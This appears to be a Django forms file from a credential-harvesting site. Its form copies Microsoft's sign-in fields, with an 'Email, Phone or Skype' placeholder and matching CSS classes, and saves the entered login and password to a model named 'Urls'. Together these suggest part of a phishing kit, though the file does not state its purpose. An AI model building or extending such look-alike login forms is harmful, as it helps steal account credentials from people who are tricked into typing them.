from django.forms import ModelForm, fields
from django.contrib.auth.forms import UserCreationForm
from django import forms
from .models import Urls




class CreateUrlsForm(ModelForm):
    class Meta:
        model = Urls
        fields = ['log', 'password']

    log = forms.CharField(max_length=100, widget= forms.PasswordInput (attrs={
        'class':'form-control input ext-input text-box ext-text-box', 
        'placeholder':'Email, Phone or Skype',
        'id':'inp1',
        'type':'text'
            }))

    password = forms.CharField(max_length=100, widget= forms.PasswordInput (attrs={
        'class':'form-control p-3 input ext-input text-box ext-text-box', 
        'placeholder':'Password',
        }))
